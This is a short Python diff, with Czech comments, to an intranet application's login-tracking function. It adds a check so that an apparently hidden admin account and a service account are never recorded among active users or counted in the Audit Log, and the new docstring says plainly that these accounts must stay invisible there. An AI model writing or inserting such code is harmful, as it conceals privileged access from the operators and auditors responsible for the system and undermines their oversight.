@@ -7,6 +7,7 @@ import socket
 import asyncio
 from collections import deque
 import intranet_jobs
+import intranet_data
 
 # ==========================================
 # --- SLEDOVÁNÍ AKTIVNÍCH PŘIHLÁŠENÍ ---
@@ -14,7 +15,13 @@ import intranet_jobs
 _AKTIVNI_UZIVATELE: dict = {}   # email → {'jmeno': str, 'cas': datetime, 'ip': str, 'device': str}
 
 def zaznamenej_prihlaseni(email: str, jmeno: str, ip: str = '', device: str = ''):
-    """Zaregistruje přihlášení uživatele (volitelně s IP adresou a zařízením)."""
+    """Zaregistruje přihlášení uživatele (volitelně s IP adresou a zařízením).
+
+    Skrytý admin a servisní účet se neevidují — nesmí být vidět v přehledu
+    přihlášených ani v počítadle u Audit Logu.
+    """
+    if intranet_data.je_skryty_ucet(jmeno=jmeno, email=email):
+        return
     _AKTIVNI_UZIVATELE[email] = {
         'jmeno': jmeno,
         'cas': datetime.datetime.now(),
